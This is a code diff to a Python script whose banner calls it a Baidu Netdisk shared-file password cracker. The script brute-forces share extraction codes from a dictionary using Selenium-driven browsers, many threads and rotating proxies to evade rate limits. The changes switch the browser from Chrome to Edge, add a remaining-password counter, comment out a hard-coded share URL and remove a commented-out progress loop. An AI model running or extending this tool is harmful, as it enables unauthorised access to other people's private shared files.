@@ -31,7 +31,7 @@ def loaddict():
         if ignorelist[i]==0:
             pwddict.append(i)
     
-print("==============================================================")
+print("===========")
 print("百度网盘分享文件密码破解器 by MXWXZ   最后测试于2018年5月9日)")
 # url=input("请输入URL地址（https://pan.baidu.com/share/init?xxx）：")
 
@@ -52,12 +52,12 @@ proxyfile=""
 proxyurl=""
 # proxylife=input("请输入切换IP频率（秒数）：")
 proxylife=40
-print("==============================================================")
+print("===========")
 loaddict()
 srctot=totpwd=len(pwddict)
 print("密码总数：",totpwd)
 # input("按回车键继续……")
-print("==============================================================")
+print("===========")
 pwdlock = threading.Lock()
 def GetPwd():
     if pwdlock.acquire(True):
@@ -67,12 +67,16 @@ def GetPwd():
         num=random.randint(0,totpwd-1)
         ret=pwddict[num]
         del pwddict[num]
+        print("剩余密码数：",totpwd, end="\r")
         totpwd-=1
         pwdlock.release()
         return ret
-options = webdriver.ChromeOptions()
+# options = webdriver.ChromeOptions()
 # 无头浏览器，不弹出图形界面，注释后会弹出图形界面
 # options.add_argument('--headless')
+
+# use Edge instead 
+options = webdriver.EdgeOptions()
 
 options.add_argument('--no-sandbox')
 # selenium会输出大量日志，这里将其金庸
@@ -90,7 +94,7 @@ def check(pwd):
         # prefs = {'profile.default_content_settings.popups': 0, 'download.default_directory': os.getcwd()}
         # options.add_experimental_option('prefs', prefs)
 
-        driver = webdriver.Chrome(options=options)
+        driver = webdriver.Edge(options=options)
         driver.get(url)
         driver.refresh()
         # time.sleep(5)
@@ -148,8 +152,8 @@ def fuck():
         # prefs = {'profile.default_content_settings.popups': 0, 'download.default_directory': os.getcwd()}
         # options.add_experimental_option('prefs', prefs)
 
-        driver = webdriver.Chrome(options=options)
-        url="https://pan.baidu.com/share/init?surl=t5fahahxsAZvNZ0jujrQKQ"
+        driver = webdriver.Edge(options=options)
+        # url="https://pan.baidu.com/share/init?surl=t5fahahxsAZvNZ0jujrQKQ"
         driver.get(url)
         # 直接打开网址显示没有，需要刷新一次
         driver.refresh()
@@ -229,25 +233,3 @@ if __name__=="__main__":
     for i in range(int(threadnum)):
         threadid.append(threading.Thread(target = fuck, args=()))
         threadid[i].start()
-    # while 1:
-    #     alive=0
-    #     for i in range(int(threadnum)):
-    #         if threadid[i].is_alive()=="True":
-    #             alive=1
-    #             break
-    #     if password == "":
-    #         print("%.2f%s"%((srctot-totpwd)*100/srctot,'%')," %d/s "%((last-totpwd)/3)," %d seconds last        "%(totpwd/((last-totpwd)/3) if (last-totpwd)/3!=0 else 999999999),end='\r')
-    #         last=totpwd
-    #         if totpwd == 0 and alive == 0:
-    #             print("囧……密码未找到……")
-    #             input("按回车键退出……")
-    #             break
-    #     else:
-    #         print("%.2f%s"%(100,'%')," %d/s "%((last-totpwd)/3)," 0 seconds last        ")
-    #         print("密码已找到！Password:",password)
-    #         fp = open("password.ans", "a")
-    #         fp.write(password)
-    #         fp.close()
-    #         input("按回车键退出……")
-    #         break
-    #     time.sleep(1)
